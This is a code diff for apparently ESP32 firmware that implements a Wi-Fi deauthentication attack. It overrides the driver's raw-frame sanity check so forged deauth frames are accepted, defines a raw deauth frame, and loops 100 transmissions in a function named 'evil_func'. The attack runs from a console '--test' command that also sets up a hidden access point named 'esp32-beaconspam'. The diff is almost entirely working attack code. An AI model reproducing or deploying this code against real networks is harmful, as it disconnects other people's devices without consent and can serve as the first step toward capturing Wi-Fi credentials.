@@ -27,16 +27,15 @@ static deauth_runtime_t _deauth_rt;
 // Add linker flags (component.mk and/or CMakeLists and/or Makefile)
 // COMPONENT_ADD_LDFLAGS += -z muldefs
 // Redefine ieee80211_raw_frame_sanity_check somewhere
-
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   ESP_LOGD(TAG,"Intercepted ieee80211_raw_frame_sanity_check");
   return 0;
 }
 
-extern "C" int ieee80211_rrr_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+/*extern "C" int ieee80211_rrr_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   ESP_LOGD(TAG,"Intercepted ieee80211_rrr_frame_sanity_check");
   return 0;
-}
+}*/
 
 static uint8_t deauth_frame[] = {
     0xc0, 0x00,                             // Frame control (deauth code: 12)
@@ -85,9 +84,14 @@ static uint8_t deauth_frame[] = {
 //
 //
 void evil_func() {
-    for (int k = 0; k < 100; k++) {
-        ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false));
-            vTaskDelay(20 / portTICK_PERIOD_MS);
+    for (int k = 0; k < 100; k++) 
+    {
+        esp_err_t __err_rc = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        if (__err_rc != ESP_OK) {
+            ESP_LOGE(TAG,"Raw frames not supported!!!");
+            break;
+        }       
+        vTaskDelay(20 / portTICK_PERIOD_MS);
     }
 }
 
@@ -97,14 +101,11 @@ void evil_func() {
 //
 static esp_err_t death_test(deauth_runtime_t *pmon)
 {
-    //wifi_station_start(7);
-    //evil_func();
-
     wifi_config_t ap_config;
     strcpy((char*)ap_config.ap.ssid, "esp32-beaconspam");
     ap_config.ap.ssid_len = 0;
     strcpy((char*)ap_config.ap.password, "dummypassword");
-    ap_config.ap.channel = 1;
+    ap_config.ap.channel = WiFi.get_channel();
     ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
     ap_config.ap.ssid_hidden = 1;
     ap_config.ap.max_connection = 4;
@@ -120,8 +121,6 @@ static esp_err_t death_test(deauth_runtime_t *pmon)
              ap_config.ap.ssid, 
              ap_config.ap.password);
 
-    // Note: actual size is calculated
-    //esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
     evil_func();
     return ESP_OK;
 }
@@ -138,7 +137,7 @@ static int do_deauth_cmd(int argc, char **argv)
         arg_print_errors(stderr, _deauth_args.end, argv[0]);
         return 0;
     }
-    bool bChangeOnTheFly = _deauth_rt.is_running;
+    //bool bChangeOnTheFly = _deauth_rt.is_running;
     // --test
     if (_deauth_args.test->count) {
         death_test(&_deauth_rt);
